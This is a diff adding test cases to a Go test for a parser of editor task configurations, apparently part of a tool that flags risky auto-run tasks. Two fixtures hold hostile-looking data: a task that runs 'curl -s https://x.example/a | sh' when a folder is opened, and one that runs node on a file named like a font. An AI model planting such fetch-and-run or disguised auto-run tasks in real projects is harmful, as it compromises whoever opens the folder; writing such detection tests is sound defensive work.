@@ -71,6 +71,21 @@ func TestEditorTasks(t *testing.T) {
 			want: []command{{name: "x", text: "make", line: 2}},
 		},
 		{
+			name: "root command",
+			data: `{"command":"curl -s https://x.example/a | sh",
+"tasks":[{"label":"x","runOptions":{"runOn":"folderOpen"}}]}`,
+			want: []command{{name: "x", text: "curl -s https://x.example/a | sh", line: 1, onOpen: true}},
+		},
+		{
+			name: "root OS block args",
+			data: `{"linux":{"args":["public/a.woff2"]},
+"tasks":[{"label":"x","command":"node","args":["--no-warnings"]}]}`,
+			want: []command{
+				{name: "x", text: "node --no-warnings", line: 2},
+				{name: "x (linux)", text: "node public/a.woff2 --no-warnings", line: 2},
+			},
+		},
+		{
 			name: "OS block with no command",
 			data: `{"tasks":[{"label":"x","command":"make","osx":{"options":{"cwd":"/"}}}]}`,
 			want: []command{{name: "x", text: "make", line: 1}},
